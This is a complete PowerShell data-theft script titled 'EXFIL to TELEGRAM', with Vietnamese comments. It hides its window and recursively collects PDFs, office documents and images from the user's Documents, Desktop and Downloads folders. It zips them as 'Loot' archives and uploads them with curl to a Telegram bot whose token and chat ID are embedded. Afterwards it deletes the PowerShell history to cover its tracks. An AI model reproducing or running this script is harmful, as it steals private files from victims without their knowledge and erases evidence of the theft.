<# 
============================================ EXFIL to TELEGRAM =================================================
#>
param (
    [string[]]$FileType = "pdf",
    [string[]]$Path = "Downloads",
    [string]$hide = 'y'
)

# 1. Cơ chế ẩn cửa sổ (Stealth Mode)
if($hide -eq 'y'){
    $w=(Get-Process -PID $pid).MainWindowHandle
    $a='[DllImport("user32.dll")] public static extern bool ShowWindowAsync(IntPtr hWnd,int nCmdShow);'
    $t=Add-Type -MemberDefinition $a -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
    if($w -ne [System.IntPtr]::Zero){ [void]$t::ShowWindowAsync($w,0) }
}

# 2. Thiết lập Telegram
$Token   = "8734606734:AAEW7nl8oRmtFKZV2SdVgtUAnWtPcH7bThw"
$ChatID  = "8312702210"
$TeleURL = "https://api.telegram.org/bot$Token/sendDocument"

Function FindAndSend {
    param ([string[]]$FileType, [string[]]$Path)
    
    $maxZipFileSize = 15MB 
    $currentZipSize = 0
    $index = 1
    $zipFilePath = "$env:TEMP\Loot$index.zip"

    # Thiết lập thư mục tìm kiếm (Sửa lỗi nối chuỗi đường dẫn)
    if($Path){
        $foldersToSearch = $Path | ForEach-Object { Join-Path $env:USERPROFILE $_ }
    } else {
        $foldersToSearch = @(
            (Join-Path $env:USERPROFILE "Documents"),
            (Join-Path $env:USERPROFILE "Desktop"),
            (Join-Path $env:USERPROFILE "Downloads")
        )
    }

    # Thiết lập định dạng file
    $fileExtensions = if($FileType) { "*.$FileType" } else { @("*.txt", "*.doc*", "*.pdf", "*.xls*", "*.png", "*.jpg") }

    Add-Type -AssemblyName System.IO.Compression.FileSystem

    # Khởi tạo file nén đầu tiên
    if (Test-Path $zipFilePath) { Remove-Item $zipFilePath -Force }
    $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')

    foreach ($folder in $foldersToSearch) {
        if (!(Test-Path $folder)) { continue }
        
        # Quét file với Recurse (tìm cả trong thư mục con)
        $files = Get-ChildItem -Path $folder -Filter $fileExtensions -File -Recurse -ErrorAction SilentlyContinue
        
        foreach ($file in $files) {
            $fileSize = $file.Length
            
            # Nếu thêm file này vào sẽ vượt quá giới hạn nén -> Gửi và tạo file mới
            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                $zipArchive.Dispose()
                
                # Gửi file zip hiện tại qua Telegram
                curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$zipFilePath" | Out-Null
                
                Remove-Item $zipFilePath -Force
                $index++
                $currentZipSize = 0
                $zipFilePath = "$env:TEMP\Loot$index.zip"
                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
            }
            
            try {
                # Tạo tên file trong zip (giữ cấu trúc thư mục tương đối)
                $entryName = $file.FullName.Replace($folder, "").TrimStart("\")
                [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                $currentZipSize += $fileSize
            } catch {}
        }
    }
    
    # Đóng và gửi phần file còn lại sau khi kết thúc vòng lặp
    $zipArchive.Dispose()
    if (Test-Path $zipFilePath) {
        if ((Get-Item $zipFilePath).Length -gt 22) { # 22 bytes là kích thước file zip trống
            curl.exe -X POST $TeleURL -F "chat_id=$ChatID" -F "document=@$zipFilePath" | Out-Null
        }
        Remove-Item $zipFilePath -Force
    }
}

# Thực thi
FindAndSend -FileType $FileType -Path $Path

# Xóa dấu vết
Remove-Item (Get-PSReadLineOption).HistorySavePath -Force -ErrorAction SilentlyContinue
Stop-Process -Id $PID -Force
